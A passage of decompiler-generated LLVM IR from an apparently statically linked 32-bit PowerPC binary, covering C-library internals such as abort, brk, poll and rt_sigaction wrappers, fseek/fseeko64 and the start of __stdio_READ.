  %v1_1000e464 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000e464 = add i32 %v1_1000e464, 136
  %v3_1000e464 = inttoptr i32 %v2_1000e464 to i32*
  %v0_1000e468 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e468 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000e468 = add i32 %v1_1000e468, 132
  %v3_1000e468 = inttoptr i32 %v2_1000e468 to i32*
  store i32 %v0_1000e468, i32* %v3_1000e468, align 4
  %v0_1000e470.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e46c

dec_label_pc_1000e46c:                            ; preds = %dec_label_pc_1000e440, %dec_label_pc_1000e410, %dec_label_pc_1000e450
  %v0_1000e470 = phi i32 [ %v0_1000e42c, %dec_label_pc_1000e440 ], [ %v0_1000e42c, %dec_label_pc_1000e410 ], [ %v0_1000e470.pre, %dec_label_pc_1000e450 ]
  store i32 %v0_1000e3c4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e470

; uselistorder directives
  uselistorder i32 %v0_1000e42c, { 0, 1, 3, 2 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000e46c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e410, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e4b8.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000e49c = call i32 @__pthread_return_0()
  %v2_1000e4a4 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000e4a4, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000e4bc33 = add i32 %v2_1000e4a4, 124
  %v4_1000e4bc34 = inttoptr i32 %v3_1000e4bc33 to i32*
  store i32 0, i32* %v4_1000e4bc34, align 4
  %v0_1000e4c035 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e4c036 = add i32 %v0_1000e4c035, -1
  store i32 %v1_1000e4c036, i32* %r9.global-to-local, align 4
  %v0_1000e4c437 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e4c438 = add i32 %v0_1000e4c437, -1
  store i32 %v1_1000e4c438, i32* %ctr.global-to-local, align 4
  %v2_1000e4c439 = icmp eq i32 %v1_1000e4c438, 0
  br i1 %v2_1000e4c439, label %dec_label_pc_1000e4c8, label %dec_label_pc_1000e4b8.dec_label_pc_1000e4b8_crit_edge

dec_label_pc_1000e4b8.dec_label_pc_1000e4b8_crit_edge: ; preds = %dec_label_pc_1000e4b8.lr.ph, %dec_label_pc_1000e4b8.dec_label_pc_1000e4b8_crit_edge
  %v1_1000e4c040 = phi i32 [ %v1_1000e4c0, %dec_label_pc_1000e4b8.dec_label_pc_1000e4b8_crit_edge ], [ %v1_1000e4c036, %dec_label_pc_1000e4b8.lr.ph ]
  %v0_1000e4bc.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e4bc.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000e4b8 = mul i32 %v1_1000e4c040, 4
  %v3_1000e4bc = add i32 %v1_1000e4b8, %v1_1000e4bc.pre
  %v4_1000e4bc = inttoptr i32 %v3_1000e4bc to i32*
  store i32 %v0_1000e4bc.pre, i32* %v4_1000e4bc, align 4
  %v0_1000e4c0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e4c0 = add i32 %v0_1000e4c0, -1
  store i32 %v1_1000e4c0, i32* %r9.global-to-local, align 4
  %v0_1000e4c4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e4c4 = add i32 %v0_1000e4c4, -1
  store i32 %v1_1000e4c4, i32* %ctr.global-to-local, align 4
  %v2_1000e4c4 = icmp eq i32 %v1_1000e4c4, 0
  br i1 %v2_1000e4c4, label %dec_label_pc_1000e4c8, label %dec_label_pc_1000e4b8.dec_label_pc_1000e4b8_crit_edge

dec_label_pc_1000e4c8:                            ; preds = %dec_label_pc_1000e4b8.dec_label_pc_1000e4b8_crit_edge, %dec_label_pc_1000e4b8.lr.ph
  store i32 %v2_1000e4a4, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_1000e4d0 = call i32 @__sigaddset()
  %v3_1000e4d4 = icmp eq i32 %v0_1000e4d0, 0
  br i1 %v3_1000e4d4, label %dec_label_pc_1000e4dc, label %dec_label_pc_1000e4ec

dec_label_pc_1000e4dc:                            ; preds = %dec_label_pc_1000e4c8
  store i32 268494060, i32* @lr, align 4
  %v3_1000e4e8 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1000e4a4, i32 0)
  br label %dec_label_pc_1000e4ec

dec_label_pc_1000e4ec:                            ; preds = %dec_label_pc_1000e4c8, %dec_label_pc_1000e4dc
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e4f0 = load i32, i32* @global_var_10024a9c.675, align 4
  %v3_1000e4f4 = icmp eq i32 %v3_1000e4f0, 0
  br i1 %v3_1000e4f4, label %dec_label_pc_1000e4fc, label %dec_label_pc_1000e524

dec_label_pc_1000e4fc:                            ; preds = %dec_label_pc_1000e4ec
  store i32 1, i32* @global_var_10024a9c.675, align 4
  br label %dec_label_pc_1000e504

dec_label_pc_1000e504:                            ; preds = %dec_label_pc_1000e580, %dec_label_pc_1000e4fc
  store i32 ptrtoint (i32* @global_var_100249c8.673 to i32), i32* %r29.global-to-local, align 4
  %v0_1000e510 = call i32 @__pthread_return_0()
  store i32 268494108, i32* @lr, align 4
  %v1_1000e518 = call i32 @__raise(i32 6)
  %v0_1000e520 = call i32 @__pthread_return_0()
  %v3_1000e528.pre = load i32, i32* @global_var_10024a9c.675, align 4
  br label %dec_label_pc_1000e524

dec_label_pc_1000e524:                            ; preds = %dec_label_pc_1000e4ec, %dec_label_pc_1000e504
  %v0_1000e59c = phi i32 [ %v3_1000e4f0, %dec_label_pc_1000e4ec ], [ %v3_1000e528.pre, %dec_label_pc_1000e504 ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e52c = icmp eq i32 %v0_1000e59c, 1
  br i1 %v3_1000e52c, label %dec_label_pc_1000e56c.lr.ph, label %dec_label_pc_1000e59c

dec_label_pc_1000e56c.lr.ph:                      ; preds = %dec_label_pc_1000e524
  %v2_1000e538 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_10024a9c.675, align 4
  store i32 ptrtoint (i32* @global_var_1000e54c.677 to i32), i32* @lr, align 4
  %v3_1000e548 = call i32 @__GI_memset(i32 %v2_1000e538, i32 0, i32 140)
  store i32 %v2_1000e4a4, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000e4bc33, i32* %r9.global-to-local, align 4
  %v2_1000e57425 = add i32 %v2_1000e4a4, 256
  %v3_1000e57426 = inttoptr i32 %v2_1000e57425 to i32*
  store i32 -1, i32* %v3_1000e57426, align 4
  %v0_1000e57827 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e57828 = add i32 %v0_1000e57827, -1
  store i32 %v1_1000e57828, i32* %r11.global-to-local, align 4
  %v0_1000e57c29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e57c30 = add i32 %v0_1000e57c29, -1
  store i32 %v1_1000e57c30, i32* %ctr.global-to-local, align 4
  %v2_1000e57c31 = icmp eq i32 %v1_1000e57c30, 0
  br i1 %v2_1000e57c31, label %dec_label_pc_1000e580, label %dec_label_pc_1000e56c.dec_label_pc_1000e56c_crit_edge

dec_label_pc_1000e56c.dec_label_pc_1000e56c_crit_edge: ; preds = %dec_label_pc_1000e56c.lr.ph, %dec_label_pc_1000e56c.dec_label_pc_1000e56c_crit_edge
  %v1_1000e57832 = phi i32 [ %v1_1000e578, %dec_label_pc_1000e56c.dec_label_pc_1000e56c_crit_edge ], [ %v1_1000e57828, %dec_label_pc_1000e56c.lr.ph ]
  %v1_1000e570.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000e574.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e56c = mul i32 %v1_1000e57832, 4
  %v2_1000e570 = add i32 %v1_1000e56c, %v1_1000e570.pre
  store i32 %v2_1000e570, i32* %r9.global-to-local, align 4
  %v2_1000e574 = add i32 %v2_1000e570, 132
  %v3_1000e574 = inttoptr i32 %v2_1000e574 to i32*
  store i32 %v0_1000e574.pre, i32* %v3_1000e574, align 4
  %v0_1000e578 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e578 = add i32 %v0_1000e578, -1
  store i32 %v1_1000e578, i32* %r11.global-to-local, align 4
  %v0_1000e57c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e57c = add i32 %v0_1000e57c, -1
  store i32 %v1_1000e57c, i32* %ctr.global-to-local, align 4
  %v2_1000e57c = icmp eq i32 %v1_1000e57c, 0
  br i1 %v2_1000e57c, label %dec_label_pc_1000e580, label %dec_label_pc_1000e56c.dec_label_pc_1000e56c_crit_edge

dec_label_pc_1000e580:                            ; preds = %dec_label_pc_1000e56c.dec_label_pc_1000e56c_crit_edge, %dec_label_pc_1000e56c.lr.ph
  store i32 268494232, i32* @lr, align 4
  %v4_1000e594 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000e504

dec_label_pc_1000e59c:                            ; preds = %dec_label_pc_1000e524
  %v3_1000e59c = icmp eq i32 %v0_1000e59c, 2
  br i1 %v3_1000e59c, label %dec_label_pc_1000e5a4, label %dec_label_pc_1000e5b0

dec_label_pc_1000e5a4:                            ; preds = %dec_label_pc_1000e59c
  store i32 3, i32* @global_var_10024a9c.675, align 4
  br label %dec_label_pc_1000e5b0

dec_label_pc_1000e5b0:                            ; preds = %dec_label_pc_1000e59c, %dec_label_pc_1000e5a4
  %v3_1000e5b0 = phi i32 [ %v0_1000e59c, %dec_label_pc_1000e59c ], [ 3, %dec_label_pc_1000e5a4 ]
  %v1_1000e5b8 = icmp ne i32 %v3_1000e5b0, 3
  call void @__pseudo_cond_branch(i1 %v1_1000e5b8, i32 268494284)
  store i32 4, i32* @global_var_10024a9c.675, align 4
  %v1_1000e5c8 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_1000e5c8

; uselistorder directives
  uselistorder i32 %v1_1000e57c, { 1, 0 }
  uselistorder i32 %v1_1000e578, { 1, 0 }
  uselistorder i32 %v1_1000e4c4, { 1, 0 }
  uselistorder i32 %v1_1000e4c0, { 1, 0 }
  uselistorder i32 %v2_1000e4a4, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 10, 9, 8, 7, 5, 4, 3, 6, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_10024a9c.675, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268566528, { 19, 20, 0, 15, 1, 24, 3, 2, 7, 4, 18, 16, 17, 10, 11, 12, 9, 21, 22, 23, 13, 14, 5, 8, 6 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000e5b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e56c.dec_label_pc_1000e56c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000e524, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4b8.dec_label_pc_1000e4b8_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000e5d4 = add i32 %arg1, 28
  %v2_1000e5d4 = inttoptr i32 %v1_1000e5d4 to i32*
  %v3_1000e5d4 = load i32, i32* %v2_1000e5d4, align 4
  store i32 %v3_1000e5d4, i32* @global_var_10024aa0.678, align 4
  %v1_1000e5e4 = add i32 %arg1, 44
  %v2_1000e5e4 = inttoptr i32 %v1_1000e5e4 to i32*
  %v3_1000e5e4 = load i32, i32* %v2_1000e5e4, align 4
  store i32 %v3_1000e5e4, i32* @global_var_10024aa4.679, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10024aa8.642, align 4
  %v0_1000e618 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000e618)
  store i32 12, i32* @r3, align 4
  %v0_1000e620 = call i32 @__syscall_error()
  ret i32 %v0_1000e620

; uselistorder directives
  uselistorder i32* @global_var_10024aa8.642, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e63c = call i32 @__asm_mfcr()
  %v1_1000e640 = and i32 %v0_1000e63c, 268435456
  %v3_1000e640 = icmp eq i32 %v1_1000e640, 0
  store i32 %v0_1000e63c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e640, label %dec_label_pc_1000e658, label %dec_label_pc_1000e64c

dec_label_pc_1000e64c:                            ; preds = %entry
  %v0_1000e64c = call i32 @__errno_location()
  %v0_1000e650 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e650 = inttoptr i32 %v0_1000e64c to i32*
  store i32 %v0_1000e650, i32* %v2_1000e650, align 4
  br label %dec_label_pc_1000e658

dec_label_pc_1000e658:                            ; preds = %entry, %dec_label_pc_1000e64c
  %v0_1000e668 = phi i32 [ %v0_1000e63c, %entry ], [ -1, %dec_label_pc_1000e64c ]
  ret i32 %v0_1000e668

; uselistorder directives
  uselistorder label %dec_label_pc_1000e658, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e684 = call i32 @__asm_mfcr()
  %v1_1000e688 = and i32 %v0_1000e684, 268435456
  %v3_1000e688 = icmp eq i32 %v1_1000e688, 0
  store i32 %v0_1000e684, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e688, label %dec_label_pc_1000e6a0, label %dec_label_pc_1000e694

dec_label_pc_1000e694:                            ; preds = %entry
  %v0_1000e694 = call i32 @__errno_location()
  %v0_1000e698 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e698 = inttoptr i32 %v0_1000e694 to i32*
  store i32 %v0_1000e698, i32* %v2_1000e698, align 4
  br label %dec_label_pc_1000e6a0

dec_label_pc_1000e6a0:                            ; preds = %entry, %dec_label_pc_1000e694
  %v0_1000e6b0 = phi i32 [ %v0_1000e684, %entry ], [ -1, %dec_label_pc_1000e694 ]
  ret i32 %v0_1000e6b0

; uselistorder directives
  uselistorder label %dec_label_pc_1000e6a0, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000e6b4 = load i32, i32* @r5, align 4
  store i32 %v0_1000e6b4, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_1000e6bc = zext i1 %tmp to i32
  %v2_1000e6bc = ashr i32 %arg1, 31
  %v3_1000e6bc = and i32 %v2_1000e6bc, -2
  %v4_1000e6bc = or i32 %v3_1000e6bc, %v1_1000e6bc
  %v3_1000e6c0 = inttoptr i32 %v4_1000e6bc to i16*
  %v4_1000e6c0 = call i32 @__GI_fseeko64(i16* %v3_1000e6c0, i32 %arg1, i32 %v0_1000e6b4)
  ret i32 %v4_1000e6c0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000e6c4 = load i32, i32* @r7, align 4
  %v0_1000e6c8 = load i32, i32* @lr, align 4
  store i32 %v0_1000e6c8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e6c4, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000e6c4, 3
  br i1 %tmp9, label %dec_label_pc_1000e700, label %dec_label_pc_1000e6ec

dec_label_pc_1000e6ec:                            ; preds = %entry
  %v0_1000e6ec = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000e6f8 = inttoptr i32 %v0_1000e6ec to i32*
  store i32 22, i32* %v2_1000e6f8, align 4
  br label %dec_label_pc_1000e7c8

dec_label_pc_1000e700:                            ; preds = %entry
  %v2_1000e700 = add i32 %tmp, 52
  %v3_1000e700 = inttoptr i32 %v2_1000e700 to i32*
  %v4_1000e700 = load i32, i32* %v3_1000e700, align 4
  store i32 %v4_1000e700, i32* @r28, align 4
  %v3_1000e704 = icmp eq i32 %v4_1000e700, 0
  br i1 %v3_1000e704, label %dec_label_pc_1000e70c, label %dec_label_pc_1000e72c

dec_label_pc_1000e70c:                            ; preds = %dec_label_pc_1000e700
  %v2_1000e70c = add i32 %tmp, 56
  store i32 %v2_1000e70c, i32* @r29, align 4
  %v2_1000e714 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000e714, i32* @r3, align 4
  %v0_1000e720 = call i32 @__pthread_return_void()
  %v0_1000e728 = call i32 @__pthread_return_0()
  %v0_1000e72c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e72c

dec_label_pc_1000e72c:                            ; preds = %dec_label_pc_1000e700, %dec_label_pc_1000e70c
  %v0_1000e738 = phi i32 [ %tmp, %dec_label_pc_1000e700 ], [ %v0_1000e72c.pre, %dec_label_pc_1000e70c ]
  %v1_1000e72c = inttoptr i32 %v0_1000e738 to i16*
  %v2_1000e72c = load i16, i16* %v1_1000e72c, align 2
  %v3_1000e72c = zext i16 %v2_1000e72c to i32
  store i32 %v3_1000e72c, i32* %r0.global-to-local, align 4
  %v1_1000e730 = and i32 %v3_1000e72c, 64
  store i32 %v1_1000e730, i32* %r9.global-to-local, align 4
  %v3_1000e730 = icmp eq i32 %v1_1000e730, 0
  br i1 %v3_1000e730, label %dec_label_pc_1000e748, label %dec_label_pc_1000e738

dec_label_pc_1000e738:                            ; preds = %dec_label_pc_1000e72c
  store i32 %v0_1000e738, i32* @r3, align 4
  store i32 268494656, i32* @lr, align 4
  %v0_1000e73c = call i32 @__stdio_wcommit()
  %v3_1000e740 = icmp eq i32 %v0_1000e73c, 0
  br i1 %v3_1000e740, label %dec_label_pc_1000e748, label %dec_label_pc_1000e7b0

dec_label_pc_1000e748:                            ; preds = %dec_label_pc_1000e738, %dec_label_pc_1000e72c
  %v0_1000e748 = load i32, i32* @r30, align 4
  %v3_1000e748 = icmp eq i32 %v0_1000e748, 1
  br i1 %v3_1000e748, label %dec_label_pc_1000e750, label %dec_label_pc_1000e748.dec_label_pc_1000e764_crit_edge

dec_label_pc_1000e748.dec_label_pc_1000e764_crit_edge: ; preds = %dec_label_pc_1000e748
  br label %dec_label_pc_1000e764

dec_label_pc_1000e750:                            ; preds = %dec_label_pc_1000e748
  %v0_1000e750 = load i32, i32* @r31, align 4
  %v1_1000e750 = inttoptr i32 %v0_1000e750 to i16*
  %v2_1000e754 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268494684, i32* @lr, align 4
  %v4_1000e758 = call i32 @__stdio_adjust_position(i16* %v1_1000e750, i32 %v2_1000e754)
  %v1_1000e75c = icmp slt i32 %v4_1000e758, 0
  br i1 %v1_1000e75c, label %dec_label_pc_1000e7b0, label %dec_label_pc_1000e750.dec_label_pc_1000e764_crit_edge

dec_label_pc_1000e750.dec_label_pc_1000e764_crit_edge: ; preds = %dec_label_pc_1000e750
  %v0_1000e764.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e764

dec_label_pc_1000e764:                            ; preds = %dec_label_pc_1000e748.dec_label_pc_1000e764_crit_edge, %dec_label_pc_1000e750.dec_label_pc_1000e764_crit_edge
  %v0_1000e764 = phi i32 [ %v0_1000e748, %dec_label_pc_1000e748.dec_label_pc_1000e764_crit_edge ], [ %v0_1000e764.pre, %dec_label_pc_1000e750.dec_label_pc_1000e764_crit_edge ]
  %v0_1000e768 = load i32, i32* @r31, align 4
  store i32 268494708, i32* @lr, align 4
  %v5_1000e770 = call i32 @__stdio_seek(i32 %v0_1000e768, i32* nonnull %stack_var_-56, i32 %v0_1000e764)
  %v1_1000e774 = icmp slt i32 %v5_1000e770, 0
  br i1 %v1_1000e774, label %dec_label_pc_1000e7b0, label %dec_label_pc_1000e77c

dec_label_pc_1000e77c:                            ; preds = %dec_label_pc_1000e764
  %v0_1000e77c = load i32, i32* @r31, align 4
  %v1_1000e77c = inttoptr i32 %v0_1000e77c to i16*
  %v2_1000e77c = load i16, i16* %v1_1000e77c, align 2
  %v3_1000e77c = zext i16 %v2_1000e77c to i32
  store i32 %v3_1000e77c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000e784 = add i32 %v0_1000e77c, 8
  %v2_1000e784 = inttoptr i32 %v1_1000e784 to i32*
  %v3_1000e784 = load i32, i32* %v2_1000e784, align 4
  store i32 %v3_1000e784, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000e78c = and i32 %v3_1000e77c, 65464
  store i32 %v1_1000e78c, i32* %r0.global-to-local, align 4
  %v3_1000e790 = add i32 %v0_1000e77c, 2
  %v4_1000e790 = inttoptr i32 %v3_1000e790 to i8*
  store i8 0, i8* %v4_1000e790, align 1
  %v0_1000e794 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e794 = load i32, i32* @r31, align 4
  %v2_1000e794 = add i32 %v1_1000e794, 28
  %v3_1000e794 = inttoptr i32 %v2_1000e794 to i32*
  store i32 %v0_1000e794, i32* %v3_1000e794, align 4
  %v0_1000e798 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e798 = trunc i32 %v0_1000e798 to i16
  %v2_1000e798 = load i32, i32* @r31, align 4
  %v3_1000e798 = inttoptr i32 %v2_1000e798 to i16*
  store i16 %v1_1000e798, i16* %v3_1000e798, align 2
  %v0_1000e79c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e79c = load i32, i32* @r31, align 4
  %v2_1000e79c = add i32 %v1_1000e79c, 16
  %v3_1000e79c = inttoptr i32 %v2_1000e79c to i32*
  store i32 %v0_1000e79c, i32* %v3_1000e79c, align 4
  %v0_1000e7a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e7a0 = load i32, i32* @r31, align 4
  %v2_1000e7a0 = add i32 %v1_1000e7a0, 20
  %v3_1000e7a0 = inttoptr i32 %v2_1000e7a0 to i32*
  store i32 %v0_1000e7a0, i32* %v3_1000e7a0, align 4
  %v0_1000e7a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e7a4 = load i32, i32* @r31, align 4
  %v2_1000e7a4 = add i32 %v1_1000e7a4, 24
  %v3_1000e7a4 = inttoptr i32 %v2_1000e7a4 to i32*
  store i32 %v0_1000e7a4, i32* %v3_1000e7a4, align 4
  %v0_1000e7a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e7a8 = load i32, i32* @r31, align 4
  %v2_1000e7a8 = add i32 %v1_1000e7a8, 44
  %v3_1000e7a8 = inttoptr i32 %v2_1000e7a8 to i32*
  store i32 %v0_1000e7a8, i32* %v3_1000e7a8, align 4
  br label %dec_label_pc_1000e7b4

dec_label_pc_1000e7b0:                            ; preds = %dec_label_pc_1000e738, %dec_label_pc_1000e764, %dec_label_pc_1000e750
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000e7b4

dec_label_pc_1000e7b4:                            ; preds = %dec_label_pc_1000e77c, %dec_label_pc_1000e7b0
  %v0_1000e7b4 = load i32, i32* @r28, align 4
  %v3_1000e7b4 = icmp eq i32 %v0_1000e7b4, 0
  br i1 %v3_1000e7b4, label %dec_label_pc_1000e7bc, label %dec_label_pc_1000e7c8

dec_label_pc_1000e7bc:                            ; preds = %dec_label_pc_1000e7b4
  %v2_1000e7bc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000e7bc, i32* @r3, align 4
  %v0_1000e7c4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e7c8

dec_label_pc_1000e7c8:                            ; preds = %dec_label_pc_1000e7b4, %dec_label_pc_1000e6ec, %dec_label_pc_1000e7bc
  store i32 %v0_1000e6c8, i32* %r0.global-to-local, align 4
  %v0_1000e7cc = load i32, i32* @r30, align 4
  ret i32 %v0_1000e7cc

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 4, 3, 2, 23, 22, 21, 20, 17, 16, 0, 35, 44, 43, 18, 42, 41, 40, 39, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 19, 29, 28, 27, 31, 30, 38, 26, 37, 1, 25, 24, 34, 33, 32 }
  uselistorder i32 ()* @__pthread_return_void, { 43, 42, 39, 16, 15, 14, 13, 12, 11, 10, 5, 4, 3, 2, 1, 0, 41, 40, 51, 50, 49, 48, 7, 6, 9, 8, 28, 27, 26, 25, 24, 23, 32, 31, 30, 29, 47, 46, 22, 21, 45, 44, 20, 19, 18, 17, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 56, { 1, 4, 3, 0, 2 }
  uselistorder i32 52, { 2, 3, 8, 0, 5, 1, 7, 6, 4 }
  uselistorder i32 22, { 2, 14, 12, 3, 13, 4, 5, 17, 6, 18, 7, 15, 8, 9, 16, 10, 11, 0, 1 }
  uselistorder label %dec_label_pc_1000e7c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e7b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e7b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e764, { 1, 0 }
  uselistorder label %dec_label_pc_1000e72c, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000e7ec = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e7f8 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e800 = and i16 %v3_1000e7f8, 4
  %v3_1000e800 = icmp eq i16 %v1_1000e800, 0
  br i1 %v3_1000e800, label %dec_label_pc_1000e808, label %dec_label_pc_1000e840

dec_label_pc_1000e808:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1000e814, label %dec_label_pc_1000e80c

dec_label_pc_1000e80c:                            ; preds = %dec_label_pc_1000e808
  br label %dec_label_pc_1000e814

dec_label_pc_1000e814:                            ; preds = %dec_label_pc_1000e808, %dec_label_pc_1000e80c
  %v1_1000e814 = add i32 %tmp, 4
  %v2_1000e814 = inttoptr i32 %v1_1000e814 to i32*
  %v3_1000e814 = load i32, i32* %v2_1000e814, align 4
  store i32 %v3_1000e814, i32* %r3.global-to-local, align 4
  store i32 268494876, i32* @lr, align 4
  %v1_1000e818 = call i32 @__libc_read(i32 %v3_1000e814)
  store i32 %v1_1000e818, i32* %r3.global-to-local, align 4
  %v2_1000e81c = icmp sgt i32 %v1_1000e818, 0
  br i1 %v2_1000e81c, label %dec_label_pc_1000e840, label %dec_label_pc_1000e824

dec_label_pc_1000e824:                            ; preds = %dec_label_pc_1000e814
  %v3_1000e81c = icmp eq i32 %v1_1000e818, 0
  %v0_1000e824 = load i32, i32* @r31, align 4
  %v1_1000e824 = inttoptr i32 %v0_1000e824 to i16*
  %v2_1000e824 = load i16, i16* %v1_1000e824, align 2
  br i1 %v3_1000e81c, label %dec_label_pc_1000e82c, label %dec_label_pc_1000e834

dec_label_pc_1000e82c:                            ; preds = %dec_label_pc_1000e824
  %v1_1000e82c = or i16 %v2_1000e824, 4
  br label %dec_label_pc_1000e83c

dec_label_pc_1000e834:                            ; preds = %dec_label_pc_1000e824
  %v1_1000e834 = or i16 %v2_1000e824, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e83c

dec_label_pc_1000e83c:                            ; preds = %dec_label_pc_1000e82c, %dec_label_pc_1000e834
  %v1_1000e82c.sink.off0 = phi i16 [ %v1_1000e82c, %dec_label_pc_1000e82c ], [ %v1_1000e834, %dec_label_pc_1000e834 ]
